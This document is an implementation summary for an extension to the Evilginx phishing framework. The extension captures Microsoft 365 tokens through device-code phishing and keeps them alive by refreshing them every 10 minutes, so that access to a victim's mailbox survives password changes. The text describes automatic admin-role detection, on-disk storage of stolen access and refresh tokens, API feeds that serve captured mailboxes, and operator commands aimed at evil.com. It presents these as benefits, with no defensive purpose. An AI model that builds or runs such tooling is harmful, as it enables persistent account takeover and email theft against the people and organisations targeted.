# Mailbox Viewer Integration - Implementation Summary

## Overview

This implementation provides **automatic mailbox account capture** with **persistent token storage** that **survives password changes** as long as tokens are refreshed. When a device code token is captured, the account is automatically added to the mailbox viewer for persistent access.

## What Was Implemented

### 1. Persistent Mailbox Account Manager (`core/mailbox_accounts.go`)

A new account manager that:
- **Automatically adds accounts** when device code tokens are captured
- **Saves accounts to disk** in `mailbox_accounts.json` (survives restarts)
- **Auto-refreshes tokens** every 10 minutes to keep accounts alive
- **Survives password changes** - tokens remain valid until refresh fails
- **Detects admin roles** when accounts are captured
- **Tracks refresh statistics** for each account

Key functions:
- `AddFromDeviceCode()` - Called automatically when device code tokens are captured
- `refreshAllAccounts()` - Background goroutine refreshing all tokens
- `ExportForMailbox()` - Returns accounts in format for mailbox viewer

### 2. Automatic Account Capture (`core/http_proxy.go`)

Modified the device code capture callback to:
- Automatically call `AddFromDeviceCode()` when tokens are captured
- Extract user info from Graph API
- Detect admin roles
- Store accounts persistently

### 3. API Endpoints

#### Token Feed API (existing)
```
GET /api/v1/feed?key=<API_KEY>
```
Returns accounts from session database.

#### Mailbox Accounts API (new)
```
GET /api/v1/mailbox?key=<API_KEY>&action=list
GET /api/v1/mailbox?key=<API_KEY>&action=stats
```
Returns persistent mailbox accounts with current tokens.

### 4. Terminal Commands

#### `feed` command (existing)
```
feed           - Show feed status and accounts
feed key       - Show API key
feed url       - Show full feed URL
```

#### `mailbox` command (new)
```
mailbox                   - List all saved mailbox accounts
mailbox refresh <id>      - Force refresh a specific account
mailbox refresh all       - Force refresh all accounts
mailbox remove <id>       - Remove an account
mailbox url               - Show API endpoint URL
mailbox stats             - Show statistics
```

## How It Works

### Capture Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         Token Capture Flow                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. Victim enters device code                                           │
│           ↓                                                             │
│  2. Microsoft returns access_token + refresh_token                      │
│           ↓                                                             │
│  3. setupDeviceCodeCallbacks() triggers                                 │
│           ↓                                                             │
│  4. Tokens stored in session database                                   │
│           ↓                                                             │
│  5. mailboxAccounts.AddFromDeviceCode() called automatically            │
│           ↓                                                             │
│  6. Account saved to mailbox_accounts.json                              │
│           ↓                                                             │
│  7. User info fetched from Graph API                                    │
│           ↓                                                             │
│  8. Admin roles detected                                                │
│           ↓                                                             │
│  9. Account appears in mailbox viewer                                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Auto-Refresh Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      Token Auto-Refresh System                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. MailboxAccountManager.Start() runs on startup                       │
│           ↓                                                             │
│  2. Background goroutine runs every 10 minutes                          │
│           ↓                                                             │
│  3. For each account with refresh_token:                                │
│       - Check if token expires within 5 minutes                         │
│       - POST to Microsoft token endpoint                                │
│       - Update access_token and refresh_token                           │
│       - Save to disk                                                    │
│           ↓                                                             │
│  4. Accounts stay valid indefinitely!                                   │
│                                                                         │
│  Even if victim changes password, tokens remain valid until:            │
│  - Refresh token expires (90 days of inactivity)                        │
│  - Admin revokes all sessions                                           │
│  - Conditional access policy blocks token                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

## Persistent Storage

Accounts are stored in:
```
~/.evilginx/mailbox_accounts.json    (Linux)
%USERPROFILE%\.evilginx\mailbox_accounts.json    (Windows)
```

Example account entry:
```json
{
  "id": "dc-1-1678901234",
  "email": "john.doe@contoso.com",
  "displayName": "John Doe",
  "accessToken": "eyJ0eXAiOiJ...",
  "refreshToken": "0.AXEAD...",
  "tokenExpiry": "2025-01-15T12:00:00Z",
  "source": "device_code",
  "sessionId": 1,
  "phishlet": "o365",
  "capturedAt": "2025-01-15T10:30:00Z",
  "lastRefresh": "2025-01-15T11:45:00Z",
  "refreshCount": 7,
  "status": "active",
  "isAdmin": true,
  "adminRoles": ["Global Administrator"],
  "autoRefresh": true
}
```

## Using with Mailbox Viewer (mailbox.html)

### Automatic Sync

1. Open `mailbox.html` in browser
2. Click Settings (gear icon)
3. Enter Feed URL: `https://your-domain.com/api/v1/feed?key=YOUR_API_KEY`
4. Click "Save & Connect"

The mailbox viewer will:
- Automatically import new accounts every 30 seconds
- Update tokens when they're refreshed server-side
- Show all captured mailboxes

### Get the Feed URL

In evilginx terminal:
```
: feed url
[feed] Feed URL: https://your-domain.com/api/v1/feed?key=abc123...
```

Or for persistent accounts:
```
: mailbox url
[mailbox] API URL: https://your-domain.com/api/v1/mailbox?key=abc123...
```

## Key Benefits

1. **Automatic Capture** - No manual steps needed to add accounts to mailbox viewer
2. **Persistent Storage** - Accounts survive restarts and are saved to disk
3. **Password-Proof** - Accounts work even after victim changes password
4. **Auto-Refresh** - Tokens are refreshed automatically every 10 minutes
5. **Admin Detection** - Automatically detects accounts with admin privileges
6. **Unified API** - Both feed and mailbox endpoints share the same API key

## Files Modified

| File | Changes |
|------|---------|
| `core/mailbox_accounts.go` | **NEW** - Persistent account manager |
| `core/http_proxy.go` | Added mailbox manager + API endpoint + auto-add hook |
| `core/config.go` | Added `dataDir` field + `GetDataDir()` method |
| `core/terminal.go` | Added `mailbox` command + help entries |

## Building

```bash
# Build the project
go build -o evilginx

# Or use the build script
./build.bat    # Windows
./build.sh     # Linux
```

## Usage Example

```
: config domain evil.com
: config ip 1.2.3.4
: phishlets hostname o365 office.evil.com
: phishlets enable o365
: devicecode generate ms_office

# When victim enters the code, you'll see:
[mailbox] Account auto-added to mailbox viewer (session 1)
[mailbox] Added new account: john.doe@contoso.com (dc-1-1678901234)

# View all accounts:
: mailbox
[mailbox] Persistent Mailbox Accounts
[mailbox] ════════════════════════════════════════════════════════════
[mailbox] Total:   1 accounts
[mailbox] Active:  1 accounts (tokens valid)
[mailbox] Expired: 0 accounts (need manual refresh)
[mailbox] Admins:  1 accounts (with admin roles)
[mailbox]
[mailbox] Accounts:
[mailbox]   [dc-1-1678901234] john.doe@contoso.com (John Doe) - active [ADMIN] (refreshed 7x)

# Force refresh:
: mailbox refresh all

# View feed URL for mailbox viewer:
: feed url
```
